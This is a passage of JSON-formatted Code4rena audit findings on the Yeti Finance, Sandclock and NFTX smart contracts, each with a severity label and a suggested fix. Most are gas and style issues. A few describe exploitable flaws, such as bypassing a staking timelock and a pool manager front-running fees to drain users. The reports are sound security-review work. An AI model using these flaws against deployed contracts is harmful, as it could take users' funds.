Contract and the organization.  ## Impact Having unused function definitions and parameters negatively affects the contract and costs unnecessary Gas. This also makes it difficult and confusing for auditors to go through the code.  ## Proof of Concept The function \"_getColls\" is not used anywhere in the code  https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/Dependencies/LiquityBase.sol#L146-L153  ## Tools Used  ## Recommended Mitigation Steps Evaluate if the function call should be used anywhere otherwise remove the function definition.  "}, {"title": "WJLP.sol does not make use of important events to emit ", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/62", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  jayjonah8   # Vulnerability details  ## Impact There are no events emitted in the WJLP.sol file for important function calls.  The contract should make use of events for important functions like claimReward() so the protocol can track important events after deployment.  This can help spot unusual activity and assist in monitoring the protocol while its live.    ## Proof of Concept https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/AssetWrappers/WJLP/WJLP.sol#L215  ## Tools Used Manual code review     "}, {"title": "_from and _to can be the same address on wrap() function", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/58", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  jayjonah8   # Vulnerability details  ## Impact In WJLP.sol, the wrap() function pulls in _amount base tokens from _from, then stakes them to mint WAssets which it sends to _to.  It then updates _rewardOwner's reward tracking such that it now has the right to future yields from the newly minted WAssets.  But the function does not make sure that _from and _to are not the same address and failure to make this check in functions with transfer functionality has lead to severe bugs in other protocols since users rewards are updated on such transfers this can be used to manipulate the system.   ## Proof of Concept https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/AssetWrappers/WJLP/WJLP.sol#L126  https://medium.com/@Knownsec_Blockchain_Lab/knownsec-blockchain-lab-i-kill-myself-monox-finance-security-incident-analysis-2dcb4d5ac8f   ## Tools Used Manual code review   ## Recommended Mitigation Steps require(address(_from) != address(_to), \"_from and _to cannot be the same\")  "}, {"title": "Named return issue", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/24", "labels": ["bug", "disagree with severity", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-yetifinance-findings", "body": "Named return issue"}, {"title": "Must approve 0 first", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/18", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "Must approve 0 first"}, {"title": "Unnecessary payable", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/15", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-yetifinance-findings", "body": "Unnecessary payable"}, {"title": "Prefix increments are cheaper than postfix increments", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/12", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "Prefix increments are cheaper than postfix increments"}, {"title": "Unnecessary array boundaries check when loading an array element twice", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/11", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "Unnecessary array boundaries check when loading an array element twice"}, {"title": "State variables that could be set immutable", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/10", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-yetifinance-findings", "body": "State variables that could be set immutable"}, {"title": "Storage double reading. Could save SLOAD", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/8", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "Storage double reading. Could save SLOAD"}, {"title": "Short the following require messages", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/7", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "Short the following require messages"}, {"title": "Unused imports", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/2", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "Unused imports"}, {"title": "unsponsor, claimYield and withdraw might fail unexpectadly", "html_url": "https://github.com/code-423n4/2022-01-sandclock-findings/issues/76", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "sponsor vault"], "target": "2022-01-sandclock-findings", "body": "# Handle  danb   # Vulnerability details  `totalUnderlying()` includes the invested assets, they are not in the contract balance.  when a user calls withdraw, claimYield or unsponsor, the system might not have enough assets in the balance and the transfer would fail.  especially, force unsponsor will always fail, because it tries to transfer the entire `totalUnderlying()`, which the system doesn't have:  https://github.com/code-423n4/2022-01-sandclock/blob/main/sandclock/contracts/Vault.sol#L391   ## Recommended Mitigation Steps when the system doesn't have enough balance to make the transfer, withdraw from the strategy.  "}, {"title": "Validations", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/234", "labels": ["bug", "duplicate", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Validations"}, {"title": "NFTXSimpleFeeDistributor#addReceiver: Failure to check for existing receiver", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/230", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "NFTXSimpleFeeDistributor#addReceiver: Failure to check for existing receiver"}, {"title": "NFTXMarketplaceZap: incorrect parameter name", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/228", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  GreyArt   # Vulnerability details  ## Impact  In the function `_sellVaultTokenETH`, the parameter `minWethOut` should be `minEthOut`  ## Recommended Mitigation Steps  Replace `minWethOut` with `minEthOut`  "}, {"title": "NFTXStakingZap: Sanity checks on \u201cto\u201d (dest) address", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/227", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  GreyArt   # Vulnerability details  ## Impact  The MarketplaceZap contract conducts a sanity check on the `to` address. One can therefore expect that this check is in place for the StakingZap contract as well.  We also suggest adding another check to ensure that the `to` address is not the StakingZap contract itself. Although there is a `rescue()` function to retrieve funds in these cases, it would be a hassle to do so.   ## Recommended Mitigation Steps  Include the sanity check(s) of the `to` address in the `addLiquidity*()` functions.  ```jsx require(to != address(0) && to != address(this)); ```  "}, {"title": "NFTXMarketplaceZap: Add rescue() function", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/226", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  GreyArt   # Vulnerability details  ## Impact  A `rescue()` function exists for the StakingZap contract to help retrieve any accidental fund transfer to it. It would be beneficial to have this function exist in the MarketplaceZap contract too.  ## Recommended Mitigation Steps  Include the `rescue()` function.  ```jsx function rescue(address token) external onlyOwner {  IERC20Upgradeable(token).transfer(msg.sender, IERC20Upgradeable(token).balanceOf(address(this))); } ```  "}, {"title": "NFTXMarketplaceZap: Restrict native ETH transfers to WETH contract", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/224", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  GreyArt   # Vulnerability details  ## Impact  Native fund transfers into the zap contract are only expected from the WETH contract. Hence, it would be good to restrict incoming fund transfers to prevent accidental native fund transfers from other sources.  This is also true even though `sushiRouter.swapExactTokensForETH()` is called, as the recipient of the swap is expected to not be the marketplace zap contract.  ## Recommended Mitigation Steps  Modify the `receive()` function to only accept transfers from the wrapped token contract.  ```jsx receive() external payable {   require(msg.sender == address(WETH), \"Only WETH\"); } ```  "}, {"title": "NFTXSimpleFeeDistributor: Inconsistency between implementation and comment", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/222", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  GreyArt   # Vulnerability details  ## Impact  In the `_sendForReceiver()` function, there are 2 comments: `// If the receive is not properly processed, send it to the treasury instead.`   and  `// If the allowance has not been spent, it means we can pass it forward to next`  which are contradictory in nature, except for the case of the last receiver in the feeReceivers array.  Looking at the `distribute()` function implementation, should the `receiveRewards()` function return false, fail, or if the `transferFrom()` was not called in its implementation, the rewards will be given to the next receiver, and not the treasury.  ```jsx // Note: some irrelevant lines were omitted for (uint256 i = 0; i < length; i++) {   uint256 amountToSend = leftover + ((tokenBalance * _feeReceiver.allocPoint) / allocTotal);   bool complete = _sendForReceiver(_feeReceiver, vaultId, _vault, amountToSend);   if (!complete) {     leftover = amountToSend;   } else {     leftover = 0;  } } ```  ## Recommended Mitigation Steps  Based on the implementation, the comment `// If the receive is not properly processed, send it to the treasury instead.` should be edited or removed.  "}, {"title": "PausableUpgradeable: Document lockId code 10 = deposit", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/221", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "PausableUpgradeable: Document lockId code 10 = deposit"}, {"title": "NFTXLPStaking: Implementation Upgrade Storage Layout Caution", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/220", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  GreyArt   # Vulnerability details  ## Impact  From what we understand, the contracts upgrade will be performed in place, where the relevant current proxies will be pointing to the new implementations. An important restriction when doing so is that the order of which the contract state variables are declared, and their types **must be preserved.** More information can be found in [OpenZeppelin\u2019s documentation](https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#modifying-your-contracts).  For the NFTXLPStaking contract, the [version of the May contest review](https://github.com/code-423n4/2021-05-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXLPStaking.sol) was:  ```jsx contract NFTXLPStaking is OwnableUpgradeable {     using SafeERC20Upgradeable for IERC20Upgradeable;      INFTXVaultFactory public nftxVaultFactory;     INFTXFeeDistributor public feeDistributor;     RewardDistributionTokenUpgradeable public rewardDistTokenImpl;     StakingTokenProvider public stakingTokenProvider;      event PoolCreated(uint256 vaultId, address pool);     event PoolUpdated(uint256 vaultId, address pool);     event FeesReceived(uint256 vaultId, uint256 amount);      struct StakingPool {         address stakingToken;         address rewardToken;     }     mapping(uint256 => StakingPool) public vaultStakingInfo;      function __NFTXLPStaking__init(address _stakingTokenProvider) external initializer { ... ```  while the new version is  ```jsx contract NFTXLPStaking is PausableUpgradeable {     using SafeERC20Upgradeable for IERC20Upgradeable;      INFTXVaultFactory public nftxVaultFactory;     IRewardDistributionToken public rewardDistTokenImpl;     StakingTokenProvider public stakingTokenProvider;      event PoolCreated(uint256 vaultId, address pool);     event PoolUpdated(uint256 vaultId, address pool);     event FeesReceived(uint256 vaultId, uint256 amount);      struct StakingPool {         address stakingToken;         address rewardToken;     }     mapping(uint256 => StakingPool) public vaultStakingInfo;      TimelockRewardDistributionTokenImpl public newTimelockRewardDistTokenImpl;      function __NFTXLPStaking__init(address _stakingTokenProvider) external initializer { ... ```  Note that the `feeDistributor` has been removed. Also note that a new base contract has been added (`PausableUpgradeable` which inherits `OwnableUpgradeable`), which has 2 mappings `isGuardian` and `isPaused`.   We however note that the current `NFTXLPStaking` implementation at [`https://etherscan.io/address/0xa64c2f3f965f055e51482bf0960ebb5f2904bf68#code`](https://etherscan.io/address/0xa64c2f3f965f055e51482bf0960ebb5f2904bf68#code) is a more recent version than that of the previous contest review. There is no change in the storage layout between this deployed version against the one being reviewed.  The ordering of state variables is determined by the C3-linearized order of contracts, so there does not seem to have been any storage collision with the change from `OwnableUpgradeable` to `PausableUpgradeable`. It also appears that the public variables are returning expected values.  ## Recommended Mitigation Steps  Upgrading implementations are a tricky affair. It is highly recommended to use tools like OpenZeppelin\u2019s upgrade plugins that validate that the new implementation is upgrade safe and is compatible with the previous one.  "}, {"title": "NFTXInventoryStaking: Index vaultId in events", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/218", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "NFTXInventoryStaking: Index vaultId in events"}, {"title": "NFTXStakingZap: Unused xTokenMinted variable ", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/217", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  GreyArt   # Vulnerability details  ## Impact  `xTokensMinted` is assigned in `provideInventory721()` and `provideInventory1155()`, but is unused.  ## Recommended Mitigation Steps  Remove the local variable `xTokensMinted`.  "}, {"title": "Cached lpStaking and inventoryStaking in Zap contracts", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/214", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Cached lpStaking and inventoryStaking in Zap contracts"}, {"title": "Pool Manager can frontrun fees to 100% and use it to steal the value from users", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/213", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Pool Manager can frontrun fees to 100% and use it to steal the value from users"}, {"title": "Constants can be made internal / private", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/209", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Since the defined constants are unneeded elsewhere, it can be defined to be internal or private to save gas.  ## Proof of Concept ``` https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXInventoryStaking.sol#L28-L30 ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Change the visibility from public to private or internal  "}, {"title": "Use unchecked math and cache values", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/208", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact 'unchecked' directive can be used where an underflow/overflow cannot happen, e.g. here: ```solidity   if (amountEth < msg.value) {     WETH.withdraw(msg.value-amountEth);     payable(to).call{value: msg.value-amountEth};   } ``` Also, to reduce gas usage, ```msg.value-amountEth``` should be cached and not re-calculated several times.  "}, {"title": "Explicit initialization with zero not required", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/207", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "Explicit initialization with zero not required"}, {"title": "Unused function input argument \"vault\"", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/205", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  PPrieditis   # Vulnerability details  ## Impact NFTXMarketplaceZap.sol function _buyVaultToken() has unused parameter \"vault\"  https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L497  ## Recommended Mitigation Steps Remove parameter \"vault\" from _buyVaultToken() and update necessary _buyVaultToken() calls.  "}, {"title": "TimelockRewardDistributionTokenImpl.sol function withdrawableRewardOf() visibility can be changed from internal to public", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/201", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "TimelockRewardDistributionTokenImpl.sol function withdrawableRewardOf() visibility can be changed from internal to public"}, {"title": "isContract() duplication and Address.sol library usage", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/199", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "isContract() duplication and Address.sol library usage"}, {"title": "Unnecessary checked arithmetic in for-loops", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/198", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Unnecessary checked arithmetic in for-loops"}, {"title": "NFTXVaultFactoryUpgradeable.sol function assignFees() does not have onlyOwner modifier", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/196", "labels": ["bug", "duplicate", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "NFTXVaultFactoryUpgradeable.sol function assignFees() does not have onlyOwner modifier"}, {"title": "`++i` costs less gass compared to `i++`", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/195", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact `++i` costs less gass compared to `i++` for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration)  ## Proof of Concept `i++` increments `i` and returns the initial value of `i`. Which means:  ``` uint i = 1; i++; // == 1 but i == 2 ```  But `++i` returns the actual incremented value:  ``` uint i = 1; ++i; // == 2 and i == 2 too, so no need for a temporary variable ```  In the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`  Instances include: ``` ./NFTXEligibilityManager.sol:85:        for (uint256 i = 0; i < modulesCopy.length; i++) { ./NFTXLPStaking.sol:81:        for (uint256 i = 0; i < vaultIds.length; i++) { ./NFTXLPStaking.sol:206:        for (uint256 i = 0; i < vaultIds.length; i++) { ./NFTXMarketplaceZap.sol:263:    for (uint256 i = 0; i < idsIn.length; i++) { ./NFTXMarketplaceZap.sol:297:    for (uint256 i = 0; i < idsIn.length; i++) { ./NFTXMarketplaceZap.sol:379:    for (uint256 i = 0; i < ids.length; i++) { ./NFTXMarketplaceZap.sol:399:    for (uint256 i = 0; i < ids.length; i++) { ./NFTXMarketplaceZap.sol:414:    for (uint256 i = 0; i < ids.length; i++) { ./NFTXMarketplaceZap.sol:437:    for (uint256 i = 0; i < idsIn.length; i++) { ./NFTXSimpleFeeDistributor.sol:62:    for (uint256 i = 0; i < length; i++) { ./NFTXStakingZap.sol:192:    for (uint256 i = 0; i < tokenIds.length; i++) { ./NFTXStakingZap.sol:203:    for (uint256 i = 0; i < tokenIds.length; i++) { ./NFTXStakingZap.sol:341:    for (uint256 i = 0; i < ids.length; i++) { ./NFTXVaultUpgradeable.sol:267:            for (uint256 i = 0; i < tokenIds.length; i++) { ./NFTXVaultUpgradeable.sol:406:            for (uint256 i = 0; i < tokenIds.length; i++) { ./NFTXVaultUpgradeable.sol:419:            for (uint256 i = 0; i < tokenIds.length; i++) { ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Use `++i` instead of `i++` to increment the value of an uint variable  "}, {"title": "Using 10**X for constants isn't gas efficient", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/193", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "Using 10**X for constants isn't gas efficient"}, {"title": "Cache storage variables in the stack can save gas", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/191", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "Cache storage variables in the stack can save gas"}, {"title": "Wrong code style", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/190", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Wrong code style"}, {"title": "Upgrade pragma to at least 0.8.4", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/189", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Upgrade pragma to at least 0.8.4"}, {"title": "Gas Optimization: Use immutable to cache beaconhash", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/187", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  gzeon   # Vulnerability details  ## Impact Calculation of `xTokenAddr` can further save gas by caching the creation hash as a immutable state.  https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXInventoryStaking.sol#L136 ``` address tokenAddr = Create2.computeAddress(salt, keccak256(type(Create2BeaconProxy).creationCode)); ```  ## Recommended Mitigation Steps ```     bytes32 internal immutable beaconhash = keccak256(type(Create2BeaconProxy).creationCode);     function xTokenAddr(address baseToken) public view virtual override returns (address) {         bytes32 salt = keccak256(abi.encodePacked(baseToken));         address tokenAddr = Create2.computeAddress(salt, beaconhash);         return tokenAddr;     } ```  "}, {"title": "Unsafe approve in NFTXSimpleFeeDistributor", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/186", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  0x1f8b   # Vulnerability details  ## Impact Unsafe approve was done.  ## Proof of Concept In the method `NFTXSimpleFeeDistributor._sendForReceiver` it's made a approve without checking the boolean result, ERC20 standard specify that the token can return false if the approve was not made, so it's mandatory to check the result of approve methods.  ## Tools Used Manual review  ## Recommended Mitigation Steps Use safe approve or check the boolean result  "}, {"title": "NFTXStakingZap and NFTXMarketplaceZap's transferFromERC721 transfer Cryptokitties to the wrong address", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/185", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  hyh   # Vulnerability details  ## Impact  `transferFromERC721(address assetAddr, uint256 tokenId, address to)` should transfer from `msg.sender` to `to`. It transfers to `address(this)` instead when ERC721 is Cryptokitties. As there is no additional logic for this case it seems to be a mistake that leads to wrong NFT accounting after such a transfer as NFT will be missed in the vault (which is `to`).  ## Proof of Concept  NFTXStakingZap: transferFromERC721 https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXStakingZap.sol#L416  NFTXMarketplaceZap: transferFromERC721 https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L556  Both functions are called by user facing Marketplace buy/sell and Staking addLiquidity/provideInventory functions.  ## Recommended Mitigation Steps  Fix the address:  Now: ``` // Cryptokitties. data = abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", msg.sender, address(this), tokenId); ```  To be: ``` // Cryptokitties. data = abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", msg.sender, to, tokenId); ```   "}, {"title": "Gas Optimization: Use uint232 for `allocPoint`", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/183", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Gas Optimization: Use uint232 for `allocPoint`"}, {"title": "Missing OOB check in `changeReceiverAlloc`", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/181", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  gzeon   # Vulnerability details  ## Impact `changeReceiverAlloc` did not check if the idx exists unlike other functions in the same contract  https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L93 ```   function changeReceiverAlloc(uint256 _receiverIdx, uint256 _allocPoint) public override virtual onlyOwner {     FeeReceiver storage feeReceiver = feeReceivers[_receiverIdx];     allocTotal -= feeReceiver.allocPoint;     feeReceiver.allocPoint = _allocPoint;     allocTotal += _allocPoint;     emit UpdateFeeReceiverAlloc(feeReceiver.receiver, _allocPoint);   } ```  ## Recommended Mitigation Steps ```require(_receiverIdx < feeReceivers.length, \"FeeDistributor: Out of bounds\");```  "}, {"title": "Importing unused contract", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/180", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Importing unused contract"}, {"title": "Use of floating pragma", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/179", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Use of floating pragma"}, {"title": "Bypass zap timelock", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/178", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  gzeon   # Vulnerability details  ## Impact The default value of `inventoryLockTime` in `NFTXStakingZap` is `7 days` while `DEFAULT_LOCKTIME` in `NFTXInventoryStaking` is 2 ms. These timelock value are used in `NFTXInventoryStaking` to eventually call `_timelockMint` in `XTokenUpgradeable`.  https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/token/XTokenUpgradeable.sol#L74 ```     function _timelockMint(address account, uint256 amount, uint256 timelockLength) internal virtual {         uint256 timelockFinish = block.timestamp + timelockLength;         timelock[account] = timelockFinish;         emit Timelocked(account, timelockFinish);         _mint(account, amount);     } ```  The applicable timelock is calculated by `block.timestamp + timelockLength`, even when the existing timelock is further in the future. Therefore, one can reduce their long (e.g. 7 days) timelock to 2 ms calling `deposit` in `NFTXInventoryStaking`  ## Proof of Concept https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXStakingZap.sol#L160 https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXInventoryStaking.sol#L30  ## Recommended Mitigation Steps ```     function _timelockMint(address account, uint256 amount, uint256 timelockLength) internal virtual {         uint256 timelockFinish = block.timestamp + timelockLength;         if(timelockFinish > timelock[account]){             timelock[account] = timelockFinish;             emit Timelocked(account, timelockFinish);         }         _mint(account, amount);     } ```  "}, {"title": "NFTXVaultFactoryUpgradeable implementation can be replaced in production breaking the system", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/177", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  hyh   # Vulnerability details  ## Impact  `NFTXVaultFactory` contract holds information regarding vaults, assets and permissions (vaults, _vaultsForAsset and excludedFromFees mappings). As there is no mechanics present that transfers this information to another implementation, the switch of nftxVaultFactory to another address performed while in production will break the system.  ## Proof of Concept  `setNFTXVaultFactory` function allows an owner to reset `nftxVaultFactory` without restrictions in the following contracts:  NFTXLPStaking https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXLPStaking.sol#L59  NFTXInventoryStaking https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXInventoryStaking.sol#L51  NFTXSimpleFeeDistributor https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L135  ## Recommended Mitigation Steps  Either restrict the ability to change the factory implementation to pre-production stages or make `nftxVaultFactory` immutable by allowing changing it only once:  Now: ``` function setNFTXVaultFactory(address newFactory) external virtual override onlyOwner {   require(newFactory != address(0));   nftxVaultFactory = INFTXVaultFactory(newFactory); } ```  To be: ``` function setNFTXVaultFactory(address newFactory) external virtual override onlyOwner {   require(nftxVaultFactory == address(0), \"nftxVaultFactory is immutable\");   nftxVaultFactory = INFTXVaultFactory(newFactory); } ```  If the implementation upgrades in production is desired, the factory data migration logic should be implemented and then used atomically together with the implementation switch in all affected contracts.   "}, {"title": "`> 0` can be replaced with `!= 0` for gas optimization", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/176", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "`> 0` can be replaced with `!= 0` for gas optimization"}, {"title": "Sell event amounts[1]", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/173", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact When emitting Sell event, it assumes that the path is always of length 2, as amounts[1] is used for the ethReceived parameter. However, the path does not have any restrictions on its length, so it is completely possible, that this is not the final amount. Events are used to inform the outside world and this may trick the consumers.  ## Recommended Mitigation Steps amounts[1] should be replaced with amounts[amounts.length - 1]  "}, {"title": "max timelockLength", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/172", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact Consider introducing a reasonable global upper limit for timelockLength in XTokenUpgradeable and TimelockRewardDistributionTokenImpl, so the users can't be locked out of their tokens forever.  ## Recommended Mitigation Steps XTokenUpgradeable and TimelockRewardDistributionTokenImpl should not trust the external input but have explicitly declared boundaries for values like timelock length to reduce possibilities of unexpected outcomes.  "}, {"title": "Use cached version of sushiRouter.WETH()", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/171", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Use cached version of sushiRouter.WETH()"}, {"title": "uint64 state variable is less efficient than uint256", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/170", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "uint64 